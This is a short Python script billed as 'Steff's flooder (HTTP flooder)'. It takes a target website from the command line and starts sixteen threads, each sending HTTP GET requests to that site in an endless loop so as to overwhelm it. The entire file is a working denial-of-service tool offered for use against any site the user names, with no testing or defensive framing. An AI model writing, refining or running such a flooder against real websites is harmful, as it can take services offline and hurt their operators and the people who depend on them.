import optparse
import time
import sys
import threading  # modules importation

try:
    import requests
except ImportError:  # if requests module isn't installed
    if sys.platform.startswith('linux'):  # if platform is linux
        print("Please install requests module")
        sys.exit(" sudo apt-get install python-requests ")  # exit


def stresser():  # stresser function

    parser = optparse.OptionParser(usage="./alien.py --host [website.com]")
    parser.add_option("--host", help=" website to flood ", action="store", dest="host", type="string")
    option, args = parser.parse_args()
    if option.host:
        host = ((option.host))
        if (host.find("http")) == -1:
            _host = "http://" + (host)
        elif (host.find("http")) == 0:
            _host = (host)
    elif not option.host:
        parser.error(" PLEASE TYPE --HOST [WEBSITE] THEN RUN FLOODER AGAIN ")
        sys.exit()

    while (1 < 4):  # infinite loop
        try:
            requests.get(_host)  # sending requests
            print(" [*] flooding {} in port 80  ".format(_host))
        except (requests.ConnectionError, requests.HTTPError):  # if host don't exist
            print("[-] host don't exist  ")
            sys.exit()  # exit


def _threads_():  # threading function


    c = threading.Thread(target=stresser)  # creating threads
    d = threading.Thread(target=stresser)
    a = threading.Thread(target=stresser)
    e = threading.Thread(target=stresser)
    z = threading.Thread(target=stresser)
    x = threading.Thread(target=stresser)
    c1 = threading.Thread(target=stresser)
    d1 = threading.Thread(target=stresser)
    a1 = threading.Thread(target=stresser)
    e1 = threading.Thread(target=stresser)
    z1 = threading.Thread(target=stresser)
    x2 = threading.Thread(target=stresser)
    x3 = threading.Thread(target=stresser)
    x4 = threading.Thread(target=stresser)
    x5 = threading.Thread(target=stresser)
    x6 = threading.Thread(target=stresser)

    c.start()  # starting threads
    d.start()
    a.start()
    e.start()
    z.start()
    x.start()
    c1.start()
    d1.start()
    a1.start()
    e1.start()
    z1.start()
    x2.start()
    x3.start()
    x4.start()
    x5.start()
    x6.start()


def main():  # main function ( most important )


    print("""

**********************************
* Steff's flooder (HTTP flooder)   *
**********************************      
""")  # ascii code (index)
    print("[*] start flooding ")  # info
    print("[*] type ALT + F4 for stop flooder ")  # info

    time.sleep(3)  # sleeping
    _threads_()  # threading function start


main()


